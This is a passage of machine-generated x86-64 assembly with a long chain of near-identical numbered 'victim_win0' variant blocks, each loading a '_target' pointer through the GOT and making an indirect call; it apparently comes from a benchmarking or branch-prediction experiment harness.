	je	.Lvictim_win0_var993
	cmpl	$994, %eax
	je	.Lvictim_win0_var994
	cmpl	$995, %eax
	je	.Lvictim_win0_var995
	cmpl	$996, %eax
	je	.Lvictim_win0_var996
	cmpl	$997, %eax
	je	.Lvictim_win0_var997
	cmpl	$998, %eax
	je	.Lvictim_win0_var998
	cmpl	$999, %eax
	je	.Lvictim_win0_var999
	jmp	.Lvictim_win0_var0
## Variant 0
.Lvictim_win0_var0:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 1
.Lvictim_win0_var1:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 2
.Lvictim_win0_var2:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 3
.Lvictim_win0_var3:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 4
.Lvictim_win0_var4:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 5
.Lvictim_win0_var5:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 6
.Lvictim_win0_var6:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 7
.Lvictim_win0_var7:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 8
.Lvictim_win0_var8:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 9
.Lvictim_win0_var9:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 10
.Lvictim_win0_var10:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 11
.Lvictim_win0_var11:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 12
.Lvictim_win0_var12:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 13
.Lvictim_win0_var13:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 14
.Lvictim_win0_var14:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 15
.Lvictim_win0_var15:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 16
.Lvictim_win0_var16:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 17
.Lvictim_win0_var17:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 18
.Lvictim_win0_var18:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 19
.Lvictim_win0_var19:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 20
.Lvictim_win0_var20:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 21
.Lvictim_win0_var21:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 22
.Lvictim_win0_var22:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 23
.Lvictim_win0_var23:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 24
.Lvictim_win0_var24:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 25
.Lvictim_win0_var25:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 26
.Lvictim_win0_var26:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 27
.Lvictim_win0_var27:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 28
.Lvictim_win0_var28:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 29
.Lvictim_win0_var29:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 30
.Lvictim_win0_var30:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 31
.Lvictim_win0_var31:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 32
.Lvictim_win0_var32:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 33
.Lvictim_win0_var33:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 34
.Lvictim_win0_var34:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 35
.Lvictim_win0_var35:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 36
.Lvictim_win0_var36:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 37
.Lvictim_win0_var37:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 38
.Lvictim_win0_var38:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 39
.Lvictim_win0_var39:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 40
.Lvictim_win0_var40:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 41
.Lvictim_win0_var41:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 42
.Lvictim_win0_var42:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 43
.Lvictim_win0_var43:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 44
.Lvictim_win0_var44:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 45
.Lvictim_win0_var45:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 46
.Lvictim_win0_var46:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 47
.Lvictim_win0_var47:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 48
.Lvictim_win0_var48:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 49
.Lvictim_win0_var49:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 50
.Lvictim_win0_var50:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 51
.Lvictim_win0_var51:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 52
.Lvictim_win0_var52:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 53
.Lvictim_win0_var53:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 54
.Lvictim_win0_var54:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 55
.Lvictim_win0_var55:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 56
.Lvictim_win0_var56:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 57
.Lvictim_win0_var57:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 58
.Lvictim_win0_var58:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 59
.Lvictim_win0_var59:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 60
.Lvictim_win0_var60:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 61
.Lvictim_win0_var61:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 62
.Lvictim_win0_var62:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 63
.Lvictim_win0_var63:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 64
.Lvictim_win0_var64:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 65
.Lvictim_win0_var65:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 66
.Lvictim_win0_var66:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 67
.Lvictim_win0_var67:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 68
.Lvictim_win0_var68:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 69
.Lvictim_win0_var69:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 70
.Lvictim_win0_var70:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 71
.Lvictim_win0_var71:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 72
.Lvictim_win0_var72:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 73
.Lvictim_win0_var73:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 74
.Lvictim_win0_var74:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 75
.Lvictim_win0_var75:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 76
.Lvictim_win0_var76:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 77
.Lvictim_win0_var77:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 78
.Lvictim_win0_var78:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 79
.Lvictim_win0_var79:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 80
.Lvictim_win0_var80:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 81
.Lvictim_win0_var81:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 82
.Lvictim_win0_var82:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 83
.Lvictim_win0_var83:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 84
.Lvictim_win0_var84:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 85
.Lvictim_win0_var85:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 86
.Lvictim_win0_var86:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 87
.Lvictim_win0_var87:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 88
.Lvictim_win0_var88:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 89
.Lvictim_win0_var89:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 90
.Lvictim_win0_var90:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 91
.Lvictim_win0_var91:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 92
.Lvictim_win0_var92:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
